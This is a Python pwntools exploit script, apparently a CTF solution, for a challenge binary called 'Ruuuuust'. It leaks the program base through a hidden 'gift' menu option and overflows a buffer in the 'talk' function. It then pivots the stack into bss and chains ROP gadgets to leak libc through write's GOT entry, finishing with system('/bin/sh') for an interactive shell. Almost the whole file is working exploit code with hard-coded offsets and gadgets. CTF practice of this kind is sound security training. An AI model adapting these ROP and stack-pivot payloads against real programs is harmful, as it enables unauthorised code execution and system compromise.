from pwn import *
context.log_level = 'debug'

p = process("./Ruuuuust")
libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
libdl = ELF("/lib/x86_64-linux-gnu/libdl-2.27.so")
elf = ELF("./Ruuuuust")

'''
0x55555555acaa:welcome
0x55555555acd4:menu
0x55555555acef:input choice

===set name===
0x55555555bdd0:read(0,v7,v6)
===show name===
0x55555555c266:function(Name)
===talk with me===
0x55555555bdd0:read(0,v7,v6)

'''

def setname(name='a'*0x10):
	p.sendlineafter("Your Choice: ",str(1))
	p.sendlineafter("Your Size: ",str(len(name)))
	p.sendafter("Your Name: ",name)
def showname():
	p.sendlineafter("Your Choice: ",str(2))
def talk(content):
	p.sendlineafter("Your Choice: ",str(3))
	p.sendlineafter("Your Size: ",str(len(content)))
	p.sendafter("want to say: ",content)
def show_show():
	p.sendlineafter("Your Choice: ",str(4))
def my_exit():
	p.sendlineafter("Your Choice: ",str(5))
def gift():
	p.sendlineafter("Your Choice: ",str(23339999))

padding = 184

gdb.attach(p,"b *$rebase(0x3c31c)")
#gdb.attach(p,"b *0x55555559031c")
#gdb.attach(p,"b *0x55555555c34d")
#gdb.attach(p,"b *$rebase(0x1C03D)")
pause()

# ===leak elf base===
gift()
p.recvuntil("gift: ")
leak_addr = int(p.recvuntil('\n',drop=1),16)
elf_base = leak_addr - (0x555555591758-0x555555554000)
log.info("elf_base:"+hex(elf_base))

pop_rdi_ret = elf_base+0x00000000000061de
pop_rsi_ret = elf_base+0x00000000000062a7
pop_rdx_ret = elf_base+0x0000000000008d93
pop_rbx_ret = elf_base+0x0000000000006d38
leave_ret = elf_base+0x000000000003c31c
ret = elf_base+0x0000000000006016

write_got = elf.sym['write']+elf_base

setname('skye'*4)
showname()

# ===overflow size===
#payload = 'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaac'


# ===read(0,bss+0x500-8,0x400)
payload = 'a'*(0xb8-0x18)+p64(leave_ret)*2+p64(elf.bss()+0x500-8+elf_base)
payload += p64(pop_rdi_ret)+p64(0)
payload += p64(pop_rsi_ret)+p64(elf.bss()+0x500-8+elf_base)
payload += p64(pop_rdx_ret)+p64(0x400)+p64(0)
payload += p64(elf_base+0x7DD0)
talk(payload)
my_exit()

# ===write(2,write_got,8)===
'''
payload = 'a'*(0xb8-8-8*6)+p64(elf.bss()+0x500+elf_base)*7
payload += p64(pop_rdi_ret) + p64(1)
payload += p64(pop_rsi_ret) + p64(write_got)
payload += p64(elf_base+0x24F10)
'''
payload = p64(elf.bss()+0x400-8+elf_base)
payload += p64(pop_rdi_ret)+p64(2)
payload += p64(pop_rsi_ret)+p64(write_got)
#payload += p64(pop_rdx_ret)+p64(0x8)+p64(0)
payload += p64(pop_rbx_ret)+p64(elf.bss()+elf_base)		#avoid crash
payload += p64(0x24F10+elf_base)

payload += p64(0xdeadbeef)								#padding

# ===read(0,bss+0x400-8,0x400)===
payload += p64(pop_rdi_ret)+p64(0)
payload += p64(pop_rsi_ret)+p64(elf.bss()+0x400-8+elf_base)
payload += p64(pop_rdx_ret)+p64(0x400)+p64(0)
payload += p64(elf_base+0x7DD0)

sleep(0.2)
p.send(payload)

# ===leak libc===
write_leak = u64(p.recv(6).ljust(8,'\x00'))
log.info("write_leak:"+hex(write_leak))
libc_base = write_leak - (0x7ffff77a5360-0x7ffff719f000)#libc.sym['write']
log.info("libc_base:"+hex(libc_base))
system_addr = libc_base + libc.sym['system']
log.info("system_addr:"+hex(system_addr))
binsh_str = libc_base + libc.search('/bin/sh').next()

# ===system(/bin/sh)===
payload = p64(elf.bss()+0x400-8+elf_base)
payload += p64(pop_rdi_ret)+p64(binsh_str)
payload += p64(ret)
payload += p64(system_addr)
sleep(0.2)
p.send(payload)

p.interactive()
